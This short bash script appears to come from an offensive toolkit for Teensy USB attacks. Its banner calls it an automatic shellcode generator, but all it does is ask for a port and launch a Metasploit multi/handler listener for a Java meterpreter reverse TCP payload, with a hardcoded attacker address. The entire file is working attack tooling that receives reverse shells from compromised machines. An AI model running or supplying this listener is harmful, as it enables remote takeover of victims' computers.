#!/bin/bash
clear
echo "***************************************************************"
echo "       Automatic  shellcode generator - FOR METASPLOIT         "
echo "       For Automatic Teensy programming and deployment         "
echo "***************************************************************"
echo -e "What Port Number are we gonna listen to? : \c"
read port
echo "      starting the meterpreter listener.."
./msfcli exploit/multi/handler  PAYLOAD=java/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=$port  E 
